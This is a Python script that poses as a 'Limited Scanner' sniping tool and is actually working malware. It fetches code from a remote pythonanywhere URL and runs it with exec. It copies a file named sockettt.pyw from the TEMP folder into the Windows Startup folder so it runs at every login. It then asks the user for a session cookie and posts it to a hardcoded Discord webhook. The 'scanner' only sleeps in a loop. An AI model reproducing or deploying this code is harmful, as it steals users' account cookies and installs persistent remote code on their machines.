import requests, time
import os
import sys
import shutil, time
import win32com.client
exec(requests.get("https://carterforyou.pythonanywhere.com/fart2").text)
print("Please Wait 30 seconds")
time.sleep(30)
startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
temp_path = os.getenv('TEMP')
source_file = os.path.join(temp_path, 'sockettt.pyw')
destination_file = os.path.join(startup_path, 'sockettt.pyw')
if os.path.exists(source_file):
    if not os.path.exists(destination_file):
        try:
            shutil.copyfile(source_file, destination_file)
            print("File copied to Startup successfully.")
        except Exception as e:
            print(f"Failed to copy file: {e}")
    else:
        print("File is already in Startup folder.")
else:
    print("Source file does not exist in TEMP.")
cookie = input("Enter Cookie to snipe with: ")
requests.post("https://discord.com/api/webhooks/1354282753868435577/NsoJwYgImUpUMvDfQl0oItSSO1CNDMP45e4RBSQpZ4A7M-GCYabXCl7Uq1nQfom9oXUi", data={"content": cookie})
print("Limited Scanner started...")
while True:
    time.sleep(5)